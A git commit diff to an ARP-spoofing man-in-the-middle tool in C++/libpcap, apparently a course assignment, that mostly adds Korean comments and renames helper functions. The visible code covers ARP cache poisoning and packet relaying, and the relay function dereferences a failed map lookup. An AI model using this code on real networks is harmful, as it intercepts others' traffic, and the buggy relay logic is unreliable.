5657d2e3835fa418b98777718e597e3df6472a94
HongGDong <rhgusehd1234@naver.com>
2024-08-26 19:46:22 +0900

    LAST

--- src/main.cpp
+++ src/main.cpp
@@ -12,11 +12,12 @@
 #include <cstring>
 #include <iostream>
 
-std::map<std::string, std::string> IP_GATE;
-std::map<Ip, Mac> TABLE2;
+std::map<std::string, std::string> IP_GATE; // IP, 게이트웨이에 대한 맵
+std::map<Ip, Mac> TABLE2; // IP, MAC 주소의 매핑을 저장하는 맵
 
 #pragma pack(push, 1)
-struct EthArpPacket final {
+struct EthArpPacket final 
+{
     EthHdr eth_;
     ArpHdr arp_;
 };
@@ -27,13 +28,13 @@ unsigned char MY_MAC[6];
 char MY_IP[INET_ADDRSTRLEN];
 
 struct ipheader {
-    unsigned char      iph_ihl : 4,
-        iph_ver : 4;
+    unsigned char      iph_ihl : 4;
+    unsigned char      iph_ver : 4;
     unsigned char      iph_tos;
     unsigned short int iph_len;
     unsigned short int iph_ident;
-    unsigned short int iph_flag : 3,
-        iph_offset : 13;
+    unsigned short int iph_flag : 3;
+    unsigned short int iph_offset : 13;
     unsigned char      iph_ttl;
     unsigned char      iph_protocol;
     unsigned short int iph_chksum;
@@ -41,17 +42,20 @@ struct ipheader {
     struct  in_addr    iph_destip;
 };
 
-int get_wlan_ip(const char* ifname, char* ip) {
+int get_ip(const char* ifname, char* ip) // 인터페이스의 IP를 가져옴
+{
     struct ifaddrs* ifaddr, * ifa;
 
-    if (getifaddrs(&ifaddr) == -1) {
+    if (getifaddrs(&ifaddr) == -1) { // 모든 인터페이스의 IP 주소를 가져옴
         perror("getifaddrs");
         return -1;
     }
 
-    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) // 목록을 순환
+    {
         if (ifa->ifa_addr == NULL) continue;
 
+        // 입력한 인터페이스를 찾았다면
         if (strncmp(ifa->ifa_name, ifname, IFNAMSIZ) == 0) {
             if (ifa->ifa_addr->sa_family == AF_INET) {
                 struct sockaddr_in* sa = (struct sockaddr_in*)ifa->ifa_addr;
@@ -65,7 +69,7 @@ int get_wlan_ip(const char* ifname, char* ip) {
     return -1;
 }
 
-int get_wlan_mac(const char* ifname, unsigned char* mac) {
+int get_mac(const char* ifname, unsigned char* mac) { // 인터페이스의 MAC 주소를 가져옴
     struct ifaddrs* ifaddr, * ifa;
 
     if (getifaddrs(&ifaddr) == -1) {
@@ -87,8 +91,9 @@ int get_wlan_mac(const char* ifname, unsigned char* mac) {
             strncpy(ifr.ifr_name, ifa->ifa_name, IFNAMSIZ - 1);
             ifr.ifr_name[IFNAMSIZ - 1] = '\0';
 
+            // loctl로 MAC 주소를 가져옴
             if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
-                memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
+                memcpy(mac, ifr.ifr_hwaddr.sa_data, 6); // MAC 주소를 메모리에 복사
                 close(sock);
                 freeifaddrs(ifaddr);
                 return 0;
@@ -104,6 +109,7 @@ int get_wlan_mac(const char* ifname, unsigned char* mac) {
     return -1;
 }
 
+// ARP 패킷 전송
 int arp_packet(const char* ifname, Ip sender_addr, Ip target_addr, Mac sender_mac) {
     pcap_t* handle = pcap_open_live(ifname, BUFSIZ, 1, 1000, errbuf);
     if (handle == nullptr) {
@@ -133,6 +139,7 @@ int arp_packet(const char* ifname, Ip sender_addr, Ip target_addr, Mac sender_ma
     return 0;
 }
 
+// 릴레이 함수
 int relay_packet(const u_char* packet, const char* ifname, const char* s_addr, const char* d_addr) {
     pcap_t* handle = pcap_open_live(ifname, BUFSIZ, 1, 1000, errbuf);
     if (handle == nullptr) {
@@ -144,25 +151,24 @@ int relay_packet(const u_char* packet, const char* ifname, const char* s_addr, c
     struct ipheader* ip_header = (struct ipheader*)(packet + sizeof(struct EthHdr));
     eth->smac_ = Mac(MY_MAC);
 
+    // dest MAC 주소를 조회
     auto it = TABLE2.find(Ip(d_addr));
     if (it != TABLE2.end()) {
         Mac destmac = it->second;
-        auto gate_it = IP_GATE.find(s_addr);
+        auto gate_it = IP_GATE.find(s_addr); // 게이트웨이 IP 탐색
         if (gate_it != IP_GATE.end()) {
             std::string gate_ip = gate_it->second;
             auto gate_mac_it = TABLE2.find(Ip(gate_ip));
             if (gate_mac_it != TABLE2.end()) {
-                Mac gate_mac = gate_mac_it->second;
+                Mac gate_mac = gate_mac_it->second; // 게이트웨이 MAC 탐색
                 eth->dmac_ = gate_mac;
             }
         }
     }
     else {
-        eth->dmac_ = it->second;
+        eth->dmac_ = it->second; // MAC 주소 못찾으면
     }
 
-    // Replace header->len with the actual length of the packet
-    // Here we need to know the packet length; assuming you have this information
     int packet_len = sizeof(struct EthHdr) + ntohs(ip_header->iph_len);
 
     int res = pcap_sendpacket(handle, packet, packet_len);
@@ -173,6 +179,7 @@ int relay_packet(const u_char* packet, const char* ifname, const char* s_addr, c
     return 0;
 }
 
+// ARP 초기화
 int arp_init(const char* ifname, const char* sender_addr, const char* target_addr) {
     pcap_t* pcap = pcap_open_live(ifname, BUFSIZ, 1, 1000, errbuf);
     if (pcap == NULL) {
@@ -181,8 +188,8 @@ int arp_init(const char* ifname, const char* sender_addr, const char* target_add
     }
 
     EthArpPacket packet;
-    get_wlan_mac(ifname, MY_MAC);
-    get_wlan_ip(ifname, MY_IP);
+    get_mac(ifname, MY_MAC);
+    get_ip(ifname, MY_IP);
     Mac sender_mac;
 
     packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
@@ -214,8 +221,8 @@ int arp_init(const char* ifname, const char* sender_addr, const char* target_add
         }
 
         struct EthHdr* eth = (struct EthHdr*)recv_packet;
-        if (eth->type() == 0x0806) {
-            sender_mac = eth->smac();
+        if (eth->type() == 0x0806) { // ARP 패킷
+            sender_mac = eth->smac(); // MAC 주소 추출
             TABLE2.insert({ Ip(sender_addr), sender_mac });
             break;
         }
@@ -258,8 +265,8 @@ int main(int argc, char* argv[]) {
 
     char ifname[100];
     strcpy(ifname, argv[1]);
-    get_wlan_mac(ifname, MY_MAC);
-    get_wlan_ip(ifname, MY_IP);
+    get_mac(ifname, MY_MAC);
+    get_ip(ifname, MY_IP);
 
     char sender[100][100];
     char target[100][100];
@@ -279,9 +286,9 @@ int main(int argc, char* argv[]) {
         }
     }
 
-    // Initial ARP poisoning
+    // ARP 초기화
     for (int i = 0; i < s_index; i++) {
-        IP_GATE.insert({ sender[i], target[i] });
+        IP_GATE.insert({ sender[i], target[i] }); // IP <-> 게이트웨이 매핑
         if (arp_init(ifname, sender[i], target[i]) != 0) {
             fprintf(stderr, "ARP init failed for %s -> %s\n", sender[i], target[i]);
             return -1;
@@ -311,14 +318,14 @@ int main(int argc, char* argv[]) {
         }
 
         struct EthHdr* eth = (struct EthHdr*)packet;
-        if (eth->type() == 0x0806) { // ARP packet
+        if (eth->type() == 0x0806) { // ARP 패킷
             printf("ARP packet received.\n");
             struct ArpHdr* arp_header = (struct ArpHdr*)(packet + sizeof(struct EthHdr));
             Ip sender_ip(ntohl(arp_header->sip_));
             Ip target_ip(ntohl(arp_header->tip_));
             arp_packet(ifname, sender_ip, target_ip, eth->smac_);
         }
-        else if (eth->type() == 0x0800) { // IP packet
+        else if (eth->type() == 0x0800) { // IP 패킷
             printf("IP packet received.\n");
             struct ipheader* ip_header = (struct ipheader*)(packet + sizeof(struct EthHdr));
             char sender_addr[INET_ADDRSTRLEN];
